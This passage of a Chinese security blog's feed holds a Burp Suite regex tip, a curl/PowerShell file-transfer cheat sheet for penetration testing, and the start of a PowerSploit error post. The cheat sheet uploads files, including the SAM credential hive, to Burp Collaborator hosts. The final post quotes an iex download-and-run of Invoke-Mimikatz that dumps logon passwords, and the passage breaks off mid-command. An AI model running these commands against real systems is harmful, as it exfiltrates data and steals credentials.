&lt;/code&gt;&lt;/pre&gt;</description></item><item><title>Burp中匹配中文</title><link>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/burp%E4%B8%AD%E5%8C%B9%E9%85%8D%E4%B8%AD%E6%96%87/</link><pubDate>Sun, 15 Jul 2018 14:30:00 +0800</pubDate><guid>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/burp%E4%B8%AD%E5%8C%B9%E9%85%8D%E4%B8%AD%E6%96%87/</guid><description>&lt;img src="https://runshell.github.io/images/image1.png" alt="Featured image of post Burp中匹配中文" /&gt;&lt;p&gt;**问题：**Burp 中有很多地方可以进行正则匹配，比如 Instruder 模块中筛选响应包，proxy 模块中匹并配替换字符串。中文在匹配的时候，添加进匹配列表就变身了，关键是与数据包内的相应字符不能匹配。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;解决办法：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;在 user option 中设置字符集(character sets)为显示原始字节流(Display as raw bytes);&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src="https://runshell.github.io/images/image1.png"
loading="lazy"
alt="image1"
&gt;&lt;/p&gt;
&lt;ol start="2"&gt;
&lt;li&gt;在响应包中复制要匹配的中文，显示的是乱码；&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src="https://runshell.github.io/images/image2.png"
loading="lazy"
alt="image2"
&gt;&lt;/p&gt;
&lt;ol start="3"&gt;
&lt;li&gt;将复制的乱码粘贴到添加匹配字符串的地方。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src="https://runshell.github.io/images/image3.png"
loading="lazy"
alt="image3"
&gt;&lt;/p&gt;</description></item><item><title>curl详解</title><link>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/curl%E8%AF%A6%E8%A7%A3/</link><pubDate>Sun, 15 Jul 2018 14:30:00 +0800</pubDate><guid>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/curl%E8%AF%A6%E8%A7%A3/</guid><description>&lt;h2 id="0x00-前言"&gt;0x00 前言
&lt;/h2&gt;&lt;p&gt;在渗透测试中经常需要在艰难的环境下执行命令，比如没有回显。为了摆脱困境，经常需要传送文件。curl是一个非常厉害的工具，在绝大多数情况下，linux系统中是存在curl的。此外Windows系统中，powershell4.0及其以后的版本中提供了一个cmlet——&lt;code&gt;Invoke-WebRequest&lt;/code&gt;，其别名之一是curl。所以，简单记录一下curl的用法。&lt;/p&gt;
&lt;h2 id="0x01-linux中的curl"&gt;0x01 Linux中的curl
&lt;/h2&gt;&lt;h3 id="1http请求"&gt;1.http请求
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;get&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;curl 命令后面直接跟url；使用-H指定请求头，每个-H指定一条header；使用 -o 指定输出到具体文件而不是标准输出。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl &lt;span style="color:#e6db74"&gt;&amp;#39;https://files.college.360.cn/others/Q1NBQS3lhoXnvZHmuJfpgI_mioDmnK8t56ysMTbor74tU01C5Y2P6K6uLnBkZg==?time=1537360082&amp;amp;sign=5fd0f26e3346e8171e8656caaa42b0fc&amp;#39;&lt;/span&gt; -H &lt;span style="color:#e6db74"&gt;&amp;#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&amp;#39;&lt;/span&gt; -H &lt;span style="color:#e6db74"&gt;&amp;#39;Referer: https://admin.college.360.cn/user/student/course/1032&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;post&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;普通表单post，使用-d指定请求体内容。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl -d &lt;span style="color:#e6db74"&gt;&amp;#34;user=admin&amp;amp;passwd=12345678&amp;#34;&lt;/span&gt; http://127.0.0.1:8080/login
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;文件表单post，使用-F指定需要上传的文件。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl http://oumchi.burpcollaborator.net -F &lt;span style="color:#e6db74"&gt;&amp;#34;6379.txt=@6379.txt&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# 发送出的请求如下：&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# POST / HTTP/1.1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# Host: oumchi.burpcollaborator.net&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# User-Agent: curl/7.58.0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# Accept: */*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# Content-Length: 1978&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# Content-Type: multipart/form-data; boundary=------------------------c9011604f054ee36&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# Expect: 100-continue&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# --------------------------c9011604f054ee36&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# Content-Disposition: form-data; name=&amp;#34;6379.txt&amp;#34;; filename=&amp;#34;6379.txt&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# Content-Type: text/plain&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# Starting Nmap 7.60 ( https://nmap.org ) at 2018-09-01 08:25 UTC&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# Stats: 0:01:21 elapsed; 0 hosts completed (64 up), 64 undergoing SYN Stealth Scan&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# SYN Stealth Scan Timing: About 3.82% done; ETC: 09:00 (0:34:01 remaining)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# Stats: 0:01:21 elapsed; 0 hosts completed (64 up), 64 undergoing SYN Stealth Scan&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# SYN Stealth Scan Timing: About 3.82% done; ETC: 09:00 (0:33:59 remaining)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# Stats: 0:01:21 elapsed; 0 hosts completed (64 up), 64 undergoing SYN Stealth Scan&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# SYN Stealth Scan Timing: About 3.83% done; ETC: 09:00 (0:33:55 remaining)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# --------------------------c9011604f054ee36--&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;put&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl http://6biy7e.burpcollaborator.net/ -T ca_setup.exe
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;其它方法测试&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl http://www.example.com -X OPTIONS
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl http://www.example.com -X TRACE
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="2ftp请求"&gt;2.ftp请求
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;get&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl ftp://user:passwd@ftpserver.com:port/path/filename -o filepath
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;put&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl –u name:passwd -T size.mp3 ftp://www.xxx.com/mp3/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;ls(dir)&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl ftp://user:passwd@ftpserver.com:port/path/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;delete&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl –u name:passwd ftp://www.xxx.com/ -X &lt;span style="color:#e6db74"&gt;&amp;#39;DELE mp3/size.mp3&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="3其他"&gt;3.其他
&lt;/h3&gt;&lt;pre tabindex="0"&gt;&lt;code class="language-ba&amp;#39;sh" data-lang="ba&amp;#39;sh"&gt;-u, --user &amp;lt;user:password&amp;gt; 需要口令验证的http或ftp
--ntlm 使用htlm认证
-A, --user-agent &amp;lt;name&amp;gt; 指定请求头中的user-agent字段
--socks5 &amp;lt;host[:port]&amp;gt; 使用sockes5代理
-x, --proxy [protocol://]host[:port] 使用http/https代理
--post301 Do not switch to GET after following a 301 不跳转301
--post302 Do not switch to GET after following a 302 不跳转302
--post303 Do not switch to GET after following a 303 不跳转303
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id="0x02-windows中的curl"&gt;0x02 Windows中的curl
&lt;/h2&gt;&lt;p&gt;powershell 中的curl是&lt;code&gt;Invoke-WebRequest&lt;/code&gt;，它的另一个别名是wget。它是使用&lt;code&gt;-Headers &amp;lt;IDictionary&amp;gt;&lt;/code&gt;来指定请求头，powershell5.x即以前版本可以指定所有请求头，之后的版本UserAgent只能通过&lt;code&gt;-UserAgent &amp;lt;String&amp;gt;&lt;/code&gt;指定。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-powershell" data-lang="powershell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Invoke-WebRequest [-Uri] &amp;lt;Uri&amp;gt; [-Body &amp;lt;Object&amp;gt;] [-Certificate &amp;lt;X509Certificate&amp;gt;] [-CertificateThumbprint &amp;lt;String&amp;gt;] [-ContentType &amp;lt;String&amp;gt;] [-Credential &amp;lt;PSCredential&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ] [-DisableKeepAlive] [-Headers &amp;lt;IDictionary&amp;gt;] [-InFile &amp;lt;String&amp;gt;] [-MaximumRedirection &amp;lt;Int32&amp;gt;] [-Method { &lt;span style="color:#66d9ef"&gt;Default&lt;/span&gt; | Get | Head | Post | Put | Delete | Trace | Options
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; | Merge | Patch}] [-OutFile &amp;lt;String&amp;gt;] [-PassThru] [-Proxy &amp;lt;Uri&amp;gt;] [-ProxyCredential &amp;lt;PSCredential&amp;gt;] [-ProxyUseDefaultCredentials] [-SessionVariable &amp;lt;String&amp;gt;] [-Timeou
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; tSec &amp;lt;Int32&amp;gt;] [-TransferEncoding {chunked | compress | deflate | gzip | identity}] [-UseBasicParsing] [-UseDefaultCredentials] [-UserAgent &amp;lt;String&amp;gt;] [-WebSession &amp;lt;Web
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; RequestSession&amp;gt;] [&amp;lt;CommonParameters&amp;gt;]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="1http"&gt;1.http
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;get&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;使用-UserAgent 指定UA，使用-Headers指定请求头，使用-OutFile指定输出到文件。若不使用-OutFile，将返回一个HtmlWebResponseObject对象，只在屏幕上显示部分摘要信息，若要显示详细信息可以先将其存入变量，再查看变量content等属性。若只想产看响应体，可用管道符传给&lt;code&gt;write-host&lt;/code&gt;,如&lt;code&gt;curl ifconfig.me | write-host&lt;/code&gt; 。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-powershell" data-lang="powershell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Invoke-WebRequest -Uri &lt;span style="color:#e6db74"&gt;&amp;#34;https://files.college.360.cn/others/Q1NBQS3lhoXnvZHmuJfpgI_mioDmnK8t56ysMTbor74tU01C5Y2P6K6uLnBkZg==?time=1537360082&amp;amp;sign=5fd0f26e3346e8171e8656caaa42b0fc&amp;#34;&lt;/span&gt; -Headers @{&lt;span style="color:#e6db74"&gt;&amp;#34;Accept&amp;#34;&lt;/span&gt;=&lt;span style="color:#e6db74"&gt;&amp;#34;*/*&amp;#34;&lt;/span&gt;; &lt;span style="color:#e6db74"&gt;&amp;#34;Referer&amp;#34;&lt;/span&gt;=&lt;span style="color:#e6db74"&gt;&amp;#34;https://admin.college.360.cn&amp;#34;&lt;/span&gt;} -UserAgent &lt;span style="color:#e6db74"&gt;&amp;#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&amp;#34;&lt;/span&gt; -OutFile xxx.pdf
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;post&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在使用非get方法时必须用-Method指定请求方法；请求体可以用-body指定一个string或其它类型的对象，也可以从本地文件获取内容作为请求体，使用-infile指定本地文件。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-powershell" data-lang="powershell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl http&lt;span style="color:#960050;background-color:#1e0010"&gt;:&lt;/span&gt;//lti9gf.burpcollaborator.net -Method post -Body &lt;span style="color:#e6db74"&gt;&amp;#34;user=admin&amp;amp;passwd=12345678&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;put&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果服务器支持put方法，可以直接put上传文件&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-powershell" data-lang="powershell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl http&lt;span style="color:#960050;background-color:#1e0010"&gt;:&lt;/span&gt;//lti9gf.burpcollaborator.net -Method put -InFile &lt;span style="color:#960050;background-color:#1e0010"&gt;‪&lt;/span&gt;C:\sam.hive
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="2ftp"&gt;2.ftp
&lt;/h3&gt;&lt;p&gt;似乎只能下载文件&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-powershell" data-lang="powershell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl ftp&lt;span style="color:#960050;background-color:#1e0010"&gt;:&lt;/span&gt;//user&lt;span style="color:#960050;background-color:#1e0010"&gt;:&lt;/span&gt;password@127.0.0.&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;:&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;21&lt;/span&gt;/s2-&lt;span style="color:#ae81ff"&gt;057&lt;/span&gt;.py -outFile s2-&lt;span style="color:#ae81ff"&gt;057&lt;/span&gt;.py
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="0x03-netwebclient"&gt;0x03 net.webclient
&lt;/h2&gt;&lt;p&gt;在powershell4.0以前没有提供&lt;code&gt;Invoke-WebRequest&lt;/code&gt;,这时我们可以使用Net.WebClient，它是.NET Framework中的一个类。它的功能更加强大。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-powershell" data-lang="powershell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#ftp下载&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;(New-Object System.Net.WebClient).downloadfile(&lt;span style="color:#e6db74"&gt;&amp;#39;ftp://admin:admin@172.28.100.68/ppt.txt&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;ppt.txt&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#ftp上传&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;(New-Object System.Net.WebClient).uploadfile(&lt;span style="color:#e6db74"&gt;&amp;#39;ftp://admin:admin@172.28.100.68/ppt1.txt&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;ppt.txt&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#http上传&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;(New-Object System.Net.WebClient).uploadfile(&lt;span style="color:#e6db74"&gt;&amp;#39;http://8060wg.burpcollaborator.net&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;ppt.txt&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#http下载文件&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;(New-Object System.Net.WebClient).downloadfile(&lt;span style="color:#e6db74"&gt;&amp;#39;http：//172.28.100.68/ppt.txt&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;ppt.txt&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#下载到内存&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$response=(New-Object System.Net.WebClient).downloadstring(&lt;span style="color:#e6db74"&gt;&amp;#39;http：//172.28.100.68/ppt.txt&amp;#39;&lt;/span&gt;)&lt;span style="color:#75715e"&gt;#得到string&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$response=(New-Object System.Net.WebClient).downloaddata(&lt;span style="color:#e6db74"&gt;&amp;#39;http：//172.28.100.68/ppt.txt&amp;#39;&lt;/span&gt;)&lt;span style="color:#75715e"&gt;#得到byte[]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#从内存上传&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;(New-Object System.Net.WebClient).uploadstring(&lt;span style="color:#e6db74"&gt;&amp;#39;http://8060wg.burpcollaborator.net&amp;#39;&lt;/span&gt;,$response)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;(New-Object System.Net.WebClient).uploaddata(&lt;span style="color:#e6db74"&gt;&amp;#39;http://8060wg.burpcollaborator.net&amp;#39;&lt;/span&gt;,$response)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#指定请求头&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$mywebclient=(New-Object System.Net.WebClient);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$mywebclient.Headers.Add(&lt;span style="color:#e6db74"&gt;&amp;#34;Cookie&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34; HMACCOUNT=057DAB164B4FC7D1; BAIDUID=3C7BA5C29716B9F251F8BC090E0BF028:FG=1; BIDUPSID=3C7BA5C29716B9F251F8BC090E0BF028; PSTM=1532227383&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$mywebclient.Headers.Add(&lt;span style="color:#e6db74"&gt;&amp;#34;Referer&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;https://newtab.firefoxchina.cn/world-tab-index.html&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$mywebclient.downloadstring(&lt;span style="color:#e6db74"&gt;&amp;#39;http://8060wg.burpcollaborator.net&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description></item><item><title>powersploit中多个脚本在windows10和server2016上报错</title><link>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/powersploit%E4%B8%AD%E5%A4%9A%E4%B8%AA%E8%84%9A%E6%9C%AC%E5%9C%A8windows10%E5%92%8Cserver2016%E4%B8%8A%E6%8A%A5%E9%94%99/</link><pubDate>Sun, 15 Jul 2018 14:30:00 +0800</pubDate><guid>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/powersploit%E4%B8%AD%E5%A4%9A%E4%B8%AA%E8%84%9A%E6%9C%AC%E5%9C%A8windows10%E5%92%8Cserver2016%E4%B8%8A%E6%8A%A5%E9%94%99/</guid><description>&lt;p&gt;报错的脚本主要为invoke-reflectivepeinjection.ps1，其它部分脚本由于使用了invoke-reflectivepeinjection.ps1中的代码，所以也报同样的错误,比如Invoke-Mimikatz、invoke-ninjacopy等。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;错误信息如下:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-powershell" data-lang="powershell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;PS C:\WINDOWS\system32&amp;gt; iex (New-Object System.Net.WebClient).DownloadString(&lt;span style="color:#e6db74"&gt;&amp;#39;https://raw.githubusercontent.com/PowerShe
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;llMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&amp;#39;&lt;/span&gt;);Invoke-Mimikatz -Command &lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#34;privilege::debug&amp;#34; &amp;#34;sekurlsa::lo
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;gonPasswords full&amp;#34;&amp;#39;&lt;/span&gt;
